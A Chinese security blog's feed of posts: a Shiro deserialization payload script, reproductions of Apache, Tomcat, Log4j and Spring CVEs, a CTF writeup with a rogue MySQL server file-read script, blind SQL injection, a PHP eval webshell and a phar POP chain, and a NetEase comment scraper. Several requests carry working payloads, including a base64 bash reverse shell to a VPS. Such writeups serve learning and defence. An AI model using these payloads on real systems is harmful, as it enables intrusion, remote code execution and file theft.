ByteArrayInputStream bis = new ByteArrayInputStream(serialized); XMLDecoder decoder = new XMLDecoder(new BufferedInputStream(bis)); Object o = decoder.readObject(); decoder.close(); return o; }} 很好，这里就有个readObject，可以作为反序列化的入口 我们就可以通过它，去利用一些依赖的漏洞，比如CC还有URLDNS 用一下其他师傅的exp # －*-* coding:utf-8# @Time : 2022/7/13 17:36# @Author : Drunkbaby# @FileName: poc.py# @Software: VSCode# @Blog ：https://drun1baby.github.io/import base64import uuidfrom Crypto.Cipher import AESdef get_file_data(filename): with open(filename, 'rb') as f: data = f.read() return datadef aes_enc(data): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data))) return ciphertextdef aes_dec(enc_data): enc_data = base64.b64decode(enc_data) unpad = lambda s: s[:-s[-1]] key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = enc_data[:16] encryptor = AES.new(base64.b64decode(key), mode, iv) plaintext = encryptor.decrypt(enc_data[16:]) plaintext = unpad(plaintext) return plaintextif __name__ == &quot;__main__&quot;: data = get_file_data(&quot;/tmp/url.bin&quot;) print(aes_enc(data)) 这里我们采用URLDNS的链子,因为是jdk原生的，不需要任何依赖，方便检测 import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class URLDNS { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException { HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;http://5jp8y8o6rarvzt9un7j5n1b3muskg9.burpcollaborator.net&quot;); Class&lt;? extends URL&gt; cls = url.getClass(); Field hashCodeField = cls.getDeclaredField(&quot;hashCode&quot;); hashCodeField.setAccessible(true); hashCodeField.set(url, 3377); hashMap.put(url, 1); hashCodeField.set(url, -1); serialize(hashMap); // unserialize(&quot;url.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;url.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; }} 要记得删除JSESSIONID，否则不会再去校验rememberme字段 总结https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/ Shiro反序列化漏洞(一)-shiro550流程分析_哔哩哔哩_bilibili 有关RCE的部分下次进行讨论","link":"/2023/03/14/shiro1/"},{"title":"Web常见中间件复现","text":"记录自己复现中间件漏洞的一点记录 Apache HTTPD 换行解析漏洞（CVE-2017-15715）原理Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 上传一个1.php的文件，然后burp抓包可以修改，在1.php后插入一个0a 便可以成功上传，再访问1.php%0a，就可以执行了php文件 修复 升级到最新版本 对上传文件重命名 禁用上传文件的执行权限 Apache HTTPD 多后缀解析漏洞原理Apache文件解析漏洞涉及到一个解析文件的特性： Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy 若给.php后缀增加了处理器： AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 修复将AddHandler application/x-httpd-php .php的配置文件删除。 利用正则表达式1、使用SetHandler,写好正则 &lt;FileMatch “.+.php$”&gt; SetHandler application/x-httpd-php 2、禁止.php这样的文件执行 &lt;FileMatch “.+.ph(p[3457]?|t|tml).”&gt; Require all denied Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）原理由于配置不当（非默认配置），将配置文件conf/web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传 根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码 通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控 搭建好环境后可以，进入docker的shell里查看一下 可以看到readonly是false，抓个包，改为PUT看能否写入一个文件 状态码是201，应该是写入成功 于是我们就可以写入一个jsp木🐎，用蚁剑生成一下，但是直接传，发现会报404，应该是对jsp有限制 绕过方式有三种 Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格 Windows NTFS流Put/a001.jsp::$DATA HTTP/1.1 /在文件名中是非法的，也会被去除（Linux/Windows）Put/a001.jsp/http:/1.1 便可以上传成功 拿到shell 修复检测当前版本是否在影响范围内，并禁用PUT方法。 更新并升级至最新版。 最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。 Tomcat7+ 弱口令 &amp;&amp; 后台war文件getshell漏洞原理Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 启动环境后，访问/manage/html可以认证登录 经过base64编码，可以爆破弱口令，登录后，在这里可以看到有上传war包的地方 生成jsp🐎后，用jar打包成war文件 上传成功，访问200，应该没问题 拿到shell 修复 在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 后台管理避免弱口令。 Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）原理 复现 修复打补丁 在绝⼤多数应⽤的使⽤场景中，⽤户只需要在公⽹能够使⽤HTTP(S)协议访问web应⽤服务器即可。 对于weblogic服务器，在绝⼤多数情况下，只需要能够在公⽹访问weblogic提供的HTTP(S)协议的服务即可，并不需要访问T3协议。少数情况下，运维⼈员需要使⽤weblogic的T3协议： 在weblogic服务器本机执⾏weblogic的停⽌脚本； 通过WLST对weblogic进⾏脚本化配置； 编写使⽤T3协议通信的程序对weblogic进⾏状态监控及其他管理功能。 T3协议与HTTP协议均基于TCP协议，T3协议以”t3″开头，HTTP协议以“GET”、“POST”等开头，两者有明显的区别。因此可以限定只允许特定服务器访问weblogic服务器的T3协议，能够修复weblogic的JAVA反序列化漏洞。即使今后发现了weblogic的其他类存在JAVA反序列化漏洞，也能够防护 Apache Log4j2 lookup JNDI 注入漏洞(CVE-2021-44228)原理Apache Log4j是一个基于Java的日志记录组件，通过重写Log4j引入了丰富的功能特性，该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。 主要由于它log4j2提供了lookup的功能 日志中包含 ${},lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。 常见的解析有： ${ctx:loginId}${map:type}${filename}${date:MM-dd-yyyy}${docker:containerId}${docker:containerName}${docker:imageName}${env:USER}${event:Marker}${mdc:UserId}${java}${jndi:logging/context-name}${hostName}${docker:containerId}${k8s}${log4j}${main}${name}${marker}${spring}${sys:logPath}${web:rootDir} 除了这个解析，还有涉及到一个jndi注入 复现启动环境后，我们在管理员接口的action参数处进行漏洞利用 在dns平台可以收到回显 进一步利用可以运用这两个工具 JNDI 注入利用工具 JNDI-Injection-Exploit 利用如下 修复 Apache官方已发布新版本完成漏洞修复，建议及时升级至最新版本 添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true 在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true； JDK使用11.0.1、8u191、7u201、6u211及以上的高版本； 部署使用第三方防火墙产品进行安全防护。 Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）原理Spring Cloud Function将请求头中的“spring.cloud.function.routing-expression”参数作为 SpEL表达式进行处理，造成SpEL表达式注入漏洞，成功利用此漏洞可实现任意代码执行。 复现发送如下请求包 POST /functionRouter HTTP/1.1Host: 123.58.236.76User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyMS40MS4xMjIuNzMvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;)Content-Type: application/x-www-form-urlencodedContent-Length: 4test 等待一会在vps上得到回连 修复根据业务情况，更新版本修复 Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)原理Spring cloud GateWay的actuator相关端点： 获取所有路由：Get请求：http://localhost:xxxx/actuator/gateway/routes/ 添加路由：POST请求：http://localhost:xxxx/actuator/gateway/routes/路由编号 删除路由：DELETE请求：http://localhost:xxxx/actuator/gateway/routes/路由编号 获取指定路由：GET请求：http://localhost:xxxx/actuator/gateway/routes/路由编号 刷新路由：POST请求：http://localhost:xxxx/actuator/gateway/refresh 其中，调用添加路由的端点时，可以向路由中加入filters，过滤器的值允许为spEL表达式，且会解析这个spEL表达式。可以通过构造spEL进行远程命令执行。构造的filters可以直接利用gateway自带的AddResponseHeader，将spEL的执行结果添加到响应头中，直接通过响应头进行查看。 复现第一个请求，发送恶意的SpEL表达式的路由 POST /actuator/gateway/routes/qqw HTTP/1.1Host: 123.58.236.76:49135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeAccept-Language: enContent-Type: application/jsonContent-Length: 361{ &quot;id&quot;: &quot;qqw&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: {&quot;name&quot;: &quot;Result&quot;,&quot;value&quot;: &quot;#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;} }], &quot;uri&quot;: &quot;http://example.com&quot;, &quot;order&quot;: 0 } 第二个请求刷新 POST /actuator/gateway/refresh HTTP/1.1Host: 123.58.236.76:49135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeAccept-Language: enContent-Type: application/jsonContent-Length: 0 然后访问，之前恶意请求的路由，可以看到已经执行了命令 修复 如果不需要Actuator，可以通过management.endpoint.gateway.enable：false配置将其禁用。 如果需要Actuator，则应使用Spring Security对其进行保护。 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。","link":"/2022/06/10/vul/"},{"title":"NSSRound3---This1sMysql 复现","text":"是NSS平台的第三轮比赛，也是从这题里学到了很多，题目链接在下面https://www.ctfer.vip/#/problem/sheet/2265 知识点 Rogue-MySql-Server 利用SQL盲注注入出目录 MySQL写入文件 POP链构造 phar伪协议的利用 题解一来就给了源码，看操作是一个链接数据库，并且这些数据库连接的参数我们都可控 熟悉的师傅知道这就需要利用Rogue-MySql-Server这个技术（我不熟悉 可以参考https://baijiahao.baidu.com/s?id=1728256347925725724&amp;wfr=spider&amp;for=pc 所以我们可以利用如下脚本去读取文件 from socket import AF_INET, SOCK_STREAM, errorfrom asyncore import dispatcher, loop as _asyLoopfrom asynchat import async_chatfrom struct import Structfrom sys import version_infofrom logging import getLogger, INFO, StreamHandler, Formatter_rouge_mysql_sever_read_file_result = {}_rouge_mysql_server_read_file_end = Falsedef checkVersionPy3(): return not version_info &lt; (3, 0)def rouge_mysql_sever_read_file(fileName, port, showInfo): if showInfo: log = getLogger(__name__) log.setLevel(INFO) tmp_format = StreamHandler() tmp_format.setFormatter(Formatter(&quot;%(asctime)s : %(levelname)s : %(message)s&quot;)) log.addHandler( tmp_format ) def _infoShow(*args): if showInfo: log.info(*args) # ================================================ # =======No need to change after this lines======= # ================================================ __author__ = 'Gifts' __modify__ = 'Morouu' global _rouge_mysql_sever_read_file_result class _LastPacket(Exception): pass class _OutOfOrder(Exception): pass class _MysqlPacket(object): packet_header = Struct('&lt;Hbb') packet_header_long = Struct('&lt;Hbbb') def __init__(self, packet_type, payload): if isinstance(packet_type, _MysqlPacket): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = _MysqlPacket.packet_header.pack(payload_len, 0, self.packet_num) else: header = _MysqlPacket.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = &quot;&quot;.join( ( header.decode(&quot;latin1&quot;) if checkVersionPy3() else header, self.payload ) ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = raw_data[0] if checkVersionPy3() else ord(raw_data[0]) payload = raw_data[1:] return _MysqlPacket(packet_num, payload.decode(&quot;latin1&quot;) if checkVersionPy3() else payload) class _HttpRequestHandler(async_chat): def __init__(self, addr): async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.stateList = [b&quot;LEN&quot;, b&quot;Auth&quot;, b&quot;Data&quot;, b&quot;MoreLength&quot;, b&quot;File&quot;] if checkVersionPy3() else [&quot;LEN&quot;, &quot;Auth&quot;, &quot;Data&quot;, &quot;MoreLength&quot;, &quot;File&quot;] self.state = self.stateList[0] self.sub_state = self.stateList[1] self.logined = False self.file = &quot;&quot; self.push( _MysqlPacket( 0, &quot;&quot;.join(( '\\x0a', # Protocol '5.6.28-0ubuntu0.14.04.1' + '\\0', '\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00', ))) ) self.order = 1 self.states = [b'LOGIN', b'CAPS', b'ANY'] if checkVersionPy3() else ['LOGIN', 'CAPS', 'ANY'] def push(self, data): _infoShow('Pushed: %r', data) data = str(data) async_chat.push(self, data.encode(&quot;latin1&quot;) if checkVersionPy3() else data) def collect_incoming_data(self, data): _infoShow('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = b&quot;&quot;.join(self.ibuffer) if checkVersionPy3() else &quot;&quot;.join(self.ibuffer) self.ibuffer = [] if self.state == self.stateList[0]: # LEN len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1 if checkVersionPy3() else ord( data[0]) + 256 * ord(data[1]) + 65536 * ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = self.stateList[2] # Data else: self.state = self.stateList[3] # MoreLength elif self.state == self.stateList[3]: # MoreLength if (checkVersionPy3() and data[0] != b'\\0') or data[0] != '\\0': self.push(None) self.close_when_done() else: self.state = self.stateList[2] # Data elif self.state == self.stateList[2]: # Data packet = _MysqlPacket.parse(data) try: if self.order != packet.packet_num: raise _OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == '\\x03': _infoShow('Query') self.set_terminator(3) self.state = self.stateList[0] # LEN self.sub_state = self.stateList[4] # File self.file = fileName.pop(0) # end if len(fileName) == 1: global _rouge_mysql_server_read_file_end _rouge_mysql_server_read_file_end = True self.push(_MysqlPacket( packet, '\\xFB{0}'.format(self.file) )) elif packet.payload[0] == '\\x1b': _infoShow('SelectDB') self.push(_MysqlPacket( packet, '\\xfe\\x00\\x00\\x02\\x00' )) raise _LastPacket() elif packet.payload[0] in '\\x02': self.push(_MysqlPacket( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise _LastPacket() elif packet.payload == '\\x00\\x01': self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == self.stateList[4]: # File _infoShow('-- result') # fileContent _infoShow('Result: %r', data) if len(data) == 1: self.push( _MysqlPacket(packet, '\\0\\0\\0\\x02\\0\\0\\0') ) raise _LastPacket() else: self.set_terminator(3) self.state = self.stateList[0] # LEN self.order = packet.packet_num + 1 global _rouge_mysql_sever_read_file_result _rouge_mysql_sever_read_file_result.update( {self.file: data.encode() if not checkVersionPy3() else data} ) # test # print(self.file + &quot;:\\n&quot; + content.decode() if checkVersionPy3() else content) self.close_when_done() elif self.sub_state == self.stateList[1]: # Auth self.push(_MysqlPacket( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise _LastPacket() else: _infoShow('-- else') raise ValueError('Unknown packet') except _LastPacket: _infoShow('Last packet') self.state = self.stateList[0] # LEN self.sub_state = None self.order = 0 self.set_terminator(3) except _OutOfOrder: _infoShow('Out of order') self.push(None) self.close_when_done() else: _infoShow('Unknown state') self.push('None') self.close_when_done() class _MysqlListener(dispatcher): def __init__(self, sock=None): dispatcher.__init__(self, sock) if not sock: self.create_socket(AF_INET, SOCK_STREAM) self.set_reuse_addr() try: self.bind(('', port)) except error: exit() self.listen(1) def handle_accept(self): pair = self.accept() if pair is not None: _infoShow('Conn from: %r', pair[1]) _HttpRequestHandler(pair) if _rouge_mysql_server_read_file_end: self.close() _MysqlListener() _asyLoop() return _rouge_mysql_sever_read_file_resultif __name__ == '__main__': #fileName=需要读取文件,port=VPS随意开放的端口(注意端口不能为3306,原因为啥我忘了XD #不用在意SQL语句、账户、密码、选用的库，这些并不影响脚本运行 for name, content in rouge_mysql_sever_read_file(fileName=[&quot;/var/www/html/class.php&quot;], port=2333,showInfo=True).items(): print(name + &quot;:\\n&quot; + content.decode()) 我们在自己的vps上运行，然后利用hackbar发我们构造好的数据包 config[8]=true&amp;mysql[host]=VPS的IP&amp;mysql[user]=lnk&amp;mysql[pass]=lnk&amp;mysql[dbname]=lnk&amp;mysql[port]=2333 这里的config[8]就要说一下了，这也是利用到了Rogue-MySql-Server需要在mysqli_options函数中的设置 而为什么传数组8可以看Article_kelp师傅的解释（赛后的复现也是参考他的 发送后，我们在vps上就可以接受到数据 只是这个代码格式实在是难看，不知道师傅有没有好的办法转换一下 &lt;?php#class.phpclass Upload { public $file; public $filesize; public $date; public $tmp; function __construct(){ $this-&gt;file = $_FILES; } function __toString(){ return $this-&gt;file[&quot;file&quot;][&quot;name&quot;]; } function __get($value){ $this-&gt;filesize-&gt;$value = $this-&gt;date; echo $this-&gt;tmp; }}class Show{ public $source; public $str; public $filter; public function __construct($file) { $this-&gt;source = $file; $this-&gt;schema = 'php://filter/read=convert.base64-encode/resource=/tmp/'; } public function __toString() { $content = $this-&gt;str[0]-&gt;source; $content = $this-&gt;str[1]-&gt;schema; return $content; } public function __get($value){ $this-&gt;show(); return $this-&gt;$value; } public function __set($key,$value) { $this-&gt;$key = $value; } public function show() { $filename = $this-&gt;schema . $this-&gt;source; include($filename); } public function __wakeup() { if ($this-&gt;schema !== 'php://filter/read=convert.base64-encode/resource=/tmp/') { $this-&gt;schema = 'php://filter/read=convert.base64-encode/resource=/tmp/'; } if ($this-&gt;source !== 'default.jpg') { $this-&gt;source = 'default.jpg'; } }}class Test{ public $test1; public $test2; function __toString(){ $str = $this-&gt;test2-&gt;test; return 'test'; } function __get($value){ return $this-&gt;$value; } function __destruct(){ echo $this-&gt;test1; }}?&gt; &lt;?php#function.php$mysqlpath = isset($_GET['mysqlpath'])?$_GET['mysqlpath']:'mysql.txt';if(!file_exists($mysqlpath)){ die(&quot;NoNONo!&quot;);}else{ $arr = json_decode(file_get_contents($mysqlpath)); if($conn-&gt;real_connect($arr-&gt;host, $arr-&gt;user, $arr-&gt;pass, $arr-&gt;db, $arr-&gt;port)){ echo &quot;connect success&quot;; } else{ echo &quot;connect fail&quot;; }}?&gt; 两个文件都读到手 而接下来我们的利用思路就是 利用它给的mysql.txt的的参数，连接后执行sql语句写入shell（要写入到可以写入的目录，这里需要用盲注跑出来），然后由class.php构造出POP链，为了利用里面的include包含我们的shell文件 再将POP链存入phar文件，写入到之前那个可写的目录，最后通过利用function.php里的file_exists来使用phar伪协议触发phar文件的include，就能够执行shell了 所以我们现在的首要目的就是注入出可以写的那个目录 利用select @@global.secure_file_priv+ 盲注 exp如下 &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestsurl = &quot;http://1.14.71.254:28684/&quot;payload = &quot;select @@global.secure_file_priv&quot;path = ''for i in range(1, 20): for j in range(33, 127): data = { &quot;config[3]&quot;: f&quot;select if(ascii(substr(({payload}),{i},1)) = {j}, sleep(2),1)&quot; } resp = requests.post(url=url, data=data) # print(resp.elapsed.total_seconds()) if resp.elapsed.total_seconds() &gt; 2: path += chr(j) print(&quot;[+]result:&quot;, path) break 然后写入我们的shell config[3]=select '&lt;?=eval($_POST[cmd])?&gt;' into outfile '/nssctf/lnk.php';&amp;mysql[host]=127.0.0.1&amp;mysql[user]=root&amp;mysql[pass]=nssctf&amp;mysql[dbname]=ctf&amp;mysql[port]=3306 这里的3也是利用到上面那个mysql函数的参数，可以去了解一下 接下来是构造POP链，我这里直接贴那位师傅的EXP了 &lt;?phpclass Upload {}class Show{}class Test{}$phar =new Phar(&quot;qqw.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;); $a=new Test();$b=new Show();$a-&gt;test1=$b;$c0=new Upload();$c1=new Upload();$b-&gt;str[0]=$c0;$b-&gt;str[1]=$c1;$d=new Show();$c0-&gt;filesize=$d;$c1-&gt;filesize=$d;$c0-&gt;date=&quot;lnk.php&quot;;$c1-&gt;date=&quot;/nssctf/&quot;;$e=new Test();$c0-&gt;tmp=$e;$c1-&gt;tmp=$e;$e-&gt;test2=$d;$phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; 然后我们将phar文件16进制编码 利用select hex(LOAD_FILE('文件的路径')); 然后传过去 随后就可以直接RCE了，flag在env里 参考这位师傅写的很详细，感谢🙏 https://www.cnblogs.com/Article-kelp/p/16271464.html","link":"/2022/05/15/thisismysql/"},{"title":"爬取网易云评论数据","text":"主要是涉及到一些加解密的东西，AES加密算法等，不过问题不大，python直接上库 还有就是一点点js逆向调试的知识，对于CTF选手理解起来应该问题不大 视频链接 上代码 &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;# 参数加密 data: &quot;params=l7x8YID96yGLcnVqx42ssXOxw%2FNbE75LDHagas1MACEGYZvBnsSVeLufcb5U0Y2JBiRAQQbetQvjlkz8g0nmQhjwbxEBPtnoWOv7BPJj2M0XZN5k3VYEtUXdZ9qrdesaGTwYnadYrACfSL1H3UoLISMIrdtpBWBz6FZOyv3khJ8NaSdxm1bGd7iIJuGhyDqv5I3YQU5KAlMG3c1mJYhACYpbcrWBwnW62jAM2pEMPWC5rlb%2FyK0v0NiLgmeoOeS96%2BQHREM4kbFWkCg09lp60tbM1Yspk5BzdHTgpY8UtRg%3D&amp;encSecKey=6ddce7f83d1cf1f5f66b83b02de68ffc68fe9d2361c06f119abb95a11191a2784ac2975b138f278d609041370c6b32c0cce7564ceebc6b5e8e32b5e4d92deb4d7602b772b344151c4abe2974cb2e2c8a9cc5c53edced9abc7f35ff9791aa2c26adce5690eaf4b1faf827ec22b38cb799d4eaebbf873dc1467d636b7405b44c8c&quot;# params ==&gt; encText encSecKey ==&gt; encSecKey# 找到加密函数 window.asrsea(JSON.stringify(i0x), xxxxxx) ===&gt; window.asrsea = d# post请求&quot;&quot;&quot;function() { function a(a) { # a = 16 var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;; for (d = 0; a &gt; d; d += 1) e = Math.random() * b.length, e = Math.floor(e), # 随机数取整 c += b.charAt(e); # 取b中字符串处于e位置的字符 return c } function b(a, b) { var c = CryptoJS.enc.Utf8.parse(b) , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;) , e = CryptoJS.enc.Utf8.parse(a) , f = CryptoJS.AES.encrypt(e, c, { iv: d, mode: CryptoJS.mode.CBC }); return f.toString() } function c(a, b, c) { var d, e; return setMaxDigits(131), d = new RSAKeyPair(b,&quot;&quot;,c), e = encryptedString(d, a) } function d(d, e, f, g) { # d = data , e = bsR6L([&quot;流泪&quot;, &quot;强&quot;]) ==&gt; 010001, # f = bsR6L(Xp8h.md) ==&gt; 00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 var h = {} # g = bsR6L([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]) ==&gt; 0CoJUm6Qyw8W8jud , i = a(16); 传入16 return h.encText = b(d, g), h.encText = b(h.encText, i), h.encSecKey = c(i, e, f), h } function e(a, b, d, e) { var f = {}; return f.encText = c(a + e, b, d), f } window.asrsea = d, window.ecnonasr = e}();&quot;&quot;&quot;from Crypto.Cipher import AESimport requestsimport jsonfrom base64 import b64encodeurl = f&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;data = { &quot;csrf_token&quot;: &quot;&quot;, &quot;cursor&quot;: &quot;-1&quot;, &quot;offset&quot;: &quot;0&quot;, &quot;orderType&quot;: &quot;1&quot;, &quot;pageNo&quot;: &quot;1&quot;, &quot;pageSize&quot;: &quot;20&quot;, &quot;rid&quot;: &quot;R_SO_4_1454037844&quot;, &quot;threadId&quot;: &quot;R_SO_4_1454037844&quot;}d = datae = &quot;010001&quot;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;g = &quot;0CoJUm6Qyw8W8jud&quot;i = &quot;hdsiOfBnjaQBoPVg&quot;def get_encseckey(): return &quot;13ea329d6819dd53ca6277e72b006aa09a06dc3e048d66e4d85a95b1f0b1adefb1cfe2b3d08e322d900bb2fa1cedc055007c62f2c812766f0bee49273004678327861b3aa9b2112b9d88c698ac859590416ca1b2506e13430b373edac3ce674e6f591841fa93b82963a8fc7dee39ad2338d4d90864c9738519ad5c75c8e070bb&quot;def get_enctext(data): fir = enc_params(data, g) res = enc_params(fir, i) return resdef to_16(data): padding = 16 - len(data) % 16 data += chr(padding) * padding return datadef enc_params(data, key): iv = &quot;0102030405060708&quot; data = to_16(data) aes = AES.new(key=key.encode('utf-8'), mode=AES.MODE_CBC, IV=iv.encode('utf-8')) result = aes.encrypt(data.encode(&quot;utf-8&quot;)) return str(b64encode(result), &quot;utf-8&quot;)resp = requests.post(url=url, data={ &quot;params&quot;: get_enctext(json.dumps(data)), &quot;encSecKey&quot;: get_encseckey()})print(resp.text) 代码量很少，大部分都是注释，注意跑的时候，i和encSecKey的值只能用一次，刷新之后要重新调试看 部分数据 这里我本来想抓热评的，但是貌似参数传错了，抓成最新评论了","link":"/2022/03/24/wyy/"},{"title":"第一届研究生网络安全大赛 Web部分WriteUp","text":"前言看到队友周报里给了比赛附件，来复现学习一下 BabyQL是个java题，给了个jar包，用idea插件反编译看一下源码 java -cp &quot;/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ~/Downloads/第一届研究生网络安全大赛/BabyQL.jar ~/Downloads/第一届研究生网络安全大赛/ 然后jar解压一下 jar xvf ../BabyQL.jar 代码挺简单的，exp这个路由，最后的runner.execute(cmd, (IExpressContext)context, null, true, false)可以执行命令。 主要是两个点，一个是绕过hashCode，一个是绕过正则匹配 绕过hashCode这里参考HFCTF2022的ezchain，https://goodapple.top/archives/964 这位师傅的做法 一句话概括就是第一个字符+1，第二个字符-31，构造出的hashCode是相同的，利用hVanzhujiarandundunjiechan 还有就是直接碰撞爆破出字符 public static void main(String[] args) { String key = &quot;guanzhujiarandundunjiechan&quot;; for (long i = 0; i &lt; 9999999999L; i++) { if (Long.toHexString(i).hashCode() == key.hashCode()) { System.out.println(Long.toHexString(i)); } //爆破出来的 String test = &quot;d7d2d123&quot;; System.out.println(test.hashCode() == key.hashCode()); //true } 还有就是要注意，这里发包要采用json格式 import requestsimport jsonurl = &quot;http://127.0.0.1:8080/exp&quot;payload = {&quot;cmd&quot;:&quot;777&quot;,&quot;x&quot;:&quot;hVanzhujiarandundunjiechan&quot;}header = {&quot;Content-Type&quot;: &quot;application/json&quot;}resp = requests.post(url=url, data=json.dumps(payload), headers=header)print(resp.text) 绕过正则我们先尝试print试试 